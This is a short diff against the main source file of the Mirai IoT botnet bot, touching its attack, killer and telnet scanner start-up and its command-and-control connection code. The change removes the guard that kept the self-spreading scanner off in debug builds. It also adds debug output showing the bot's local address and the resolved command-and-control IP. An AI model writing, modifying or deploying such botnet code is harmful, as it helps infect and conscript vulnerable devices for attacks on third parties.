@@ -155,11 +155,14 @@ int main(int argc, char **args)
 
     attack_init();
     killer_init();
-#ifndef DEBUG
+//#ifndef DEBUG
 #ifdef MIRAI_TELNET
+#ifdef DEBUG
+    printf("[main] starting scanner\n");
+#endif
     scanner_init();
 #endif
-#endif
+//#endif
 
     while (TRUE)
     {
@@ -267,7 +270,10 @@ int main(int argc, char **args)
                         send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                     }
 #ifdef DEBUG
-                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
+                    int len=20;
+                    char buffer[len];
+                    inet_ntop(AF_INET, &(LOCAL_ADDR), buffer, len);
+                    printf("[main] Connected to CNC. Local address = %s\n", buffer);
 #endif
                 }
             }
@@ -366,7 +372,7 @@ static void resolve_cnc_addr(void)
     int len=20;
     char buffer[len];
     inet_ntop(AF_INET, &(srv_addr.sin_addr.s_addr), buffer, len);
-    printf("[main] ip address: %s\n", buffer);
+    printf("[main] CNC ip address: %s\n", buffer);
 #endif
 
     table_unlock_val(TABLE_CNC_PORT);
